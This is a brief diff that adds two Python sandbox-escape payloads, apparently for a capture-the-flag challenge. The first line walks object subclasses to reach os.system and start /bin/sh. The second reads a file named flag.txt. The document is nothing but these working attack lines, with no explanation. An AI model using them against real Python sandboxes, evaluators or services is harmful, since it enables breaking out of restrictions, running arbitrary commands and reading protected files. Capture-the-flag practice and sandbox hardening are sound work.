@@ -1,0 +1,4 @@
+().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].os.system('/bin/sh')
+
+().__class__.__bases__[0].__subclasses__()[40]("flag.txt").read()
+
